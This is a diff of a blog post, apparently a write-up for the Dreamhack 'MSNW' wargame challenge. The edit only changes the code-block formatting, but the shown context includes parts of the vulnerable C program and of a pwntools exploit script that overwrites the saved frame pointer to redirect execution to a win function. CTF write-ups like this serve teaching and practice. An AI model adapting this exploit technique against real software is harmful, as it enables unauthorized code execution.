@@ -3,8 +3,7 @@ title: MSNW
 ---
 <p>The problem can be seen <a href="https://dreamhack.io/wargame/challenges/715">here</a>.</p>
 <p>The source code of the target program is as below</p>
-{% raw %}
-<pre><code>
+{% highlight c %}
 /* msnw.c
  * gcc -no-pie -fno-stack-protector -mpreferred-stack-boundary=8 msnw.c -o msnw
 */
@@ -67,8 +66,7 @@ int main(void) {
 
     return 0;
 }
-</code></pre>
-{% endraw %}
+{% endhighlight %}
 
 <p>
     Since <code>Meong</code> allows you to overwrite the lower 2 bytes of the SFP, we can think of SFP overwrite attack.
@@ -88,8 +86,7 @@ int main(void) {
     <br>The exploit code is as below.
 </p>
 
-{% raw %}
-<pre><code>
+{% highlight python %}
 #!/usr/bin/python3
 from pwn import *
 
@@ -105,13 +102,11 @@ def ex():
     print("sfp: %x, buf_addr: %x" %  (x, buf_addr))
 
     payload = p64(win_addr)
-    while len(payload) &lt; 0x130:
+    while len(payload) < 0x130:
         payload += p64(win_addr)
     payload += p64(buf_addr)[0:2]
     p.sendafter(b": ", payload)
     p.interactive()
 
 if __name__ == "__main__": ex()
-
-</code></pre>
-{% endraw %}
+{% endhighlight %}
